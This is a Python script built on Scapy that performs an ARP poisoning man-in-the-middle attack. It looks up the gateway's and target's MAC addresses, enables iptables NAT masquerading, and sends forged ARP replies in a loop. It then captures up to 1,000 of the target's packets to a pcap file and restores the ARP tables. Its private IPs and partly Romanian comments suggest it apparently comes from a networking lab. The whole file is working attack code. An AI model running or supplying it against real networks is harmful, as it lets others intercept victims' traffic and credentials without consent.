from scapy.all import conf, ARP, Ether, send, sniff, srp, wrpcap
import os
import signal
import sys
import threading
import time

# ARP Poison parameters
gateway_ip = "198.7.0.1"
target_ip = "198.7.0.2"
packet_count = 1000
conf.iface = "eth0"  # interfata
conf.verb = 2  # verbosity level of Scapy


def get_mac(ip_address):
    """
    Used to get the MAC address of a device in the network given its IP address.
    It uses the ARP protocol to request the MAC address of the device with the given IP address.
    """
    # Create an Ethernet frame with the destination MAC address set to the broadcast address
    ethernet_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

    # Create an ARP request
    arp_request = ARP(op=1, pdst=ip_address)

    # Stack the ARP request on top of the Ethernet frame
    packet = ethernet_frame
    packet.add_payload(arp_request)

    # Send the packet and capture any responses and unanswered requests
    responses, no_responses = srp(packet)
    for packet, response in responses:
        return response[ARP].hwsrc  # hwsrc = Hardware Source
    return None


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    """
    Restore the network by sending the correct ARP replies to the gateway and target machines.
    """

    send(
        ARP(
            op=2,
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst=gateway_ip,
            hwsrc=target_mac,
            psrc=target_ip,
        ),
        count=5,
    )
    send(
        ARP(
            op=2,
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst=target_ip,
            hwsrc=gateway_mac,
            psrc=gateway_ip,
        ),
        count=5,
    )

    print("[*] Disabling IP forwarding")
    # Disable IP Forwarding
    os.system("iptables -t nat -D POSTROUTING -j MASQUERADE")
    # kill process
    os.kill(os.getpid(), signal.SIGTERM)


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    """
    Sends false ARP replies to put our machine in the middle to intercept packets.
    """
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


# Start the script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")

# Enable IP Forwarding
os.system("iptables -t nat -A POSTROUTING -j MASQUERADE ")  # made by the middle.sh also

print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Target IP address: {target_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")


# ARP poison thread
poison_thread = threading.Thread(
    target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac)
)
poison_thread.start()

# Sniff traffic and write to file. Capture is filtered on target machine
try:
    sniff_filter = "ip host " + target_ip
    print(
        f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}"
    )
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
